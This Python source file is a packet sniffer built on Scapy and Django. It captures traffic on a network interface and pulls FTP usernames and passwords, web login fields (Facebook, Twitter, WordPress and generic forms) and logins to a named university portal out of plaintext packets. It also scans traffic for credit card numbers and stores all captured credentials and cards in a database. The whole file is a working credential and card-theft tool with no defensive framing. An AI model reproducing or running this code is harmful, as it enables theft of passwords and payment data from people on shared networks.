#!/usr/bin/python

import subprocess
import shlex
import os
import time
import re

from scapy.all import *

from django.db.utils import IntegrityError

from sniffer.proc_utils import run_helpers, set_pid_status, kill_helpers 

from credentials.models import Credential
from status.models import Status
from cards.models import CreditCard

#Read in username fields from definitions file
u = open(os.path.join(os.path.dirname(os.path.realpath(__file__)),'userfields.lst'), 'r')
usrlist = u.readlines()
#Remove all of the new line characters
tmplst = []
for h in usrlist:
    tmplst.append(h.rstrip('\n'))
usrlist = tmplst

#Read in password fields from definitions file
p = open(os.path.join(os.path.dirname(os.path.realpath(__file__)),'passwdfields.lst'), 'r')
pwdlist = p.readlines()
tmplst2 = []
#Remove all of the new line characters
for g in pwdlist:
    tmplst2.append(g.rstrip('\n'))
pwdlist = tmplst2

        
ftp_list = []
class FTPCredential():
    def __init__(self, src, dst, username, passwd, payload): 
        self.src = src
        self.dst = dst
        self.username = username
        self.passwd = passwd
        self.payload = payload

    
def findFTPCredentials(pkt):
    global ftp_list
    if pkt.haslayer(IP):
        dest = pkt.getlayer(IP).dst
        src = pkt.getlayer(IP).src
        dport = pkt.getlayer(TCP).dport
        raw = pkt.sprintf('%Raw.load%')
    
        
        user = re.findall('^.?(?i)USER (.*)$', raw)
        passwd = re.findall('^.?(?i)PASS (.*)$', raw)
        if passwd:
            p_passwd = str(passwd[0]).replace('\\r\\n', '').rstrip("'")
            for i in ftp_list:
    
                if i.dst == dest and i.src == src:
                    print '[+] Password: ' + p_passwd 
                    i.passwd = p_passwd
                    i.payload = i.payload + '\n' + raw 
                    from django.db import transaction
                    try:
                        with transaction.commit_on_success():
                            Credential.objects.create(type='FTP',destination_url='',destination_ip=i.dst,destination_port=dport,username=i.username,password=p_passwd, payload=i.payload,username_field='USER',password_field='PASS',OTP=False)
                    except IntegrityError:
                        print '[!] Entry alread present...'
                    ftp_list.remove(i)
        elif user:
            exists = False
            for i in ftp_list:
                if i.dst == dest and i.src == src:
                    exists = True
            if not exists:        
                p_user = str(user[0]).replace('\\r\\n', '').rstrip("'")
                print '\n[*] Detected FTP crendentials:'
                print '[+] Host: ' + dest + ':' + str(dport)
                print '[+] User account: ' + p_user
                ftpcred = FTPCredential(src, dest, p_user, 'TODEFINE', raw)
                ftp_list.append(ftpcred)  

def findFatecSP_SAN(pkt):
    raw = ' '.join(pkt.sprintf("%Raw.load%").split())
    fatecspsanRE = re.findall('POST /.*Host: (san.fatecsp.br)', raw)
    if fatecspsanRE:
        dest = pkt.getlayer(IP).dst
        dport = pkt.getlayer(TCP).dport
        print '\n[*] Detected HTTP credentials (FATECSPSAN):'
        print '[+] Host: %s (%s:%s)' % (fatecspsanRE[0],dest,str(dport))
        userRE = re.findall('name="userid".*?(\d+).*?------', raw, re.M | re.S)
        if userRE:
            user = userRE[0].replace('%40', '@')
            p_user = str(user).replace('\\r\\n', '')
            print '[+] User: %s' % p_user
            passwdRE = re.findall('name="password"(.*?)------', raw, re.M | re.S)
            if passwdRE:
                p_passwd = str(passwdRE[0]).replace('\\r\\n', '')
                print '[+] Password: %s' % p_passwd
        
                from django.db import transaction
                try:
                    with transaction.commit_on_success():
                        Credential.objects.create(type='FATECSPSAN',destination_url=fatecspsanRE[0],destination_ip=dest,destination_port=dport,username=user,password=p_passwd,payload=pkt.sprintf("%Raw.load%"),username_field='userid',password_field='password',OTP=False)
                except IntegrityError:
                    print '[!] Entry alread present...'
    
def getType(pkt):
    raw = ' '.join(pkt.sprintf("%Raw.load%").split())
    if 'Host: www.facebook.com' in raw or 'Host: facebook.com' in raw:
        return 'FACEBOOK'
    elif 'log=' in raw and 'pwd=' in raw and 'wp-submit=Log' in raw:
        return 'WORDPRESS'
    elif 'Host: www.twitter.com' in raw or 'Host: twitter.com' in raw:
        return 'TWITTER'
    else:
        return 'GENERIC'
                    
wp_list = []
                    
class WPCredential():
    def __init__(self, src, dst, dport, url, username, passwd, payload):
        self.src = src 
        self.dst = dst
        self.dport = dport
        self.url = url
        self.username = username
        self.passwd = passwd
        self.payload = payload
                    
def findHTTPCredentials(pkt):
    raw = ' '.join(pkt.sprintf("%Raw.load%").split()).replace('\r\n',' ').replace('\\r\\n',' ')
    dest = pkt.getlayer(IP).dst
    dport = pkt.getlayer(TCP).dport
    src = pkt.getlayer(IP).src
    urlRE = re.findall('Host: (\S*?)\s', raw)
    global wp_list
    if 'POST /wp-login.php' in raw:
        wpcred = WPCredential(src, dest, dport, urlRE[0], 'TODEFINE', 'TODEFINE', raw)
        wp_list.append(wpcred)
    for usrfield in usrlist:
        userRE = re.findall(str(usrfield) + '=(.*?)(&|$)', raw)
        if userRE:
            dtype = getType(pkt)
            print '\n[*] Detected HTTP credentials (%s):' % dtype
            url = urlRE[0] if urlRE else ''
            print '[+] Host: %s (%s:%s)' % (url,dest,str(dport))
            user = userRE[0][0].replace('%40', '@').replace('+', ' ')
            print '[+] User (%s): %s' % (usrfield,user)
            for pwdfield in pwdlist:
                passwdRE = re.findall(str(pwdfield) + '=(.*?)(&|$)', raw)
                if passwdRE:
                    passwd = passwdRE[0][0]
                    print '[+] Password (%s): %s' % (pwdfield, passwd)
                    otp = False
                    if 'otp=' in raw:
                        print '[!] Possible OTP in use...'
                        otp = True
                    if dtype == 'WORDPRESS':
                        for i in wp_list:
                            if i.src == src and i.dst == dest and i.dport == dport:
                                i.username = user
                                i.password = passwd
                                i.payload = i.payload + '\n' + raw
                                try:
                                    from django.db import transaction
                                    Credential.objects.create(type=dtype,destination_url=i.url,destination_ip=i.dst,destination_port=i.dport,username=i.username,password=i.password,payload=i.payload,username_field=usrfield,password_field=pwdfield,OTP=otp)
                                except IntegrityError:
                                    print '[!] Entry alread present...'
                    else:  
                        from django.db import transaction
                        try:
                            with transaction.commit_on_success():
                                Credential.objects.create(type=dtype,destination_url=url,destination_ip=dest,destination_port=dport,username=user,password=passwd,payload=pkt.sprintf("%Raw.load%"),username_field=usrfield,password_field=pwdfield,OTP=otp)
                        except IntegrityError:
                            print '[!] Entry alread present...'
                    break
    
    
def findCreditCard(pkt):
	raw = pkt.sprintf('%Raw.load%')
	RE = re.findall('(?:\d[ -]*?){13,16}', raw)
	if RE:
		for ccv in RE:
			print '[+] May have found Card: ' + ccv
			print '[+] Validating card: ' + ccv
			from extra.pycard import Card
			cc = Card(number=ccv, month=6, year=2014, cvc=123)
			if cc.is_mod10_valid:
				print '[+] Card Valid! %s (%s)' % (ccv, cc.brand)
				from django.db import transaction
				try:
					with transaction.commit_on_success():
						CreditCard.objects.create(card_type=cc.brand,card_holder='',card_number=ccv,expiry_date_month=None,expiry_date_year=None,card_code=None)
				except IntegrityError:
					print '[!] Entry alread present...'
				except Exception,e:
					print str(e)
		
    
    
def pktAnalyze(pkt):
    if pkt.haslayer(Dot11Beacon):
        pass
    elif pkt.haslayer(Dot11ProbeReq):
        pass
    elif pkt.haslayer(TCP):     
        if pkt.haslayer(IP):  
            #if 'kamus' in ' '.join(pkt.sprintf("%Raw.load%").split()).replace('\r\n',' ').replace('\\r\\n',' '):
            #    print ' '.join(pkt.sprintf("%Raw.load%").split()).replace('\r\n',' ').replace('\\r\\n',' ')
            if not pkt.getlayer(IP).dst == '127.0.0.1':   
                findCreditCard(pkt)
                findFTPCredentials(pkt)     
                #findHTTPCredentials(pkt)
                findFatecSP_SAN(pkt)
    elif pkt.haslayer(DNS):
        pass
    
def do_sniff():
    try:
        conf.iface='en0'
        try:
            set_pid_status('Sniffer',True)
            sniff(prn=pktAnalyze, store=0)
            raise
        except KeyboardInterrupt:
            raise
        except:
            set_pid_status('Sniffer',False)
    except:
		print 'eita'
		kill_helpers()

do_sniff()
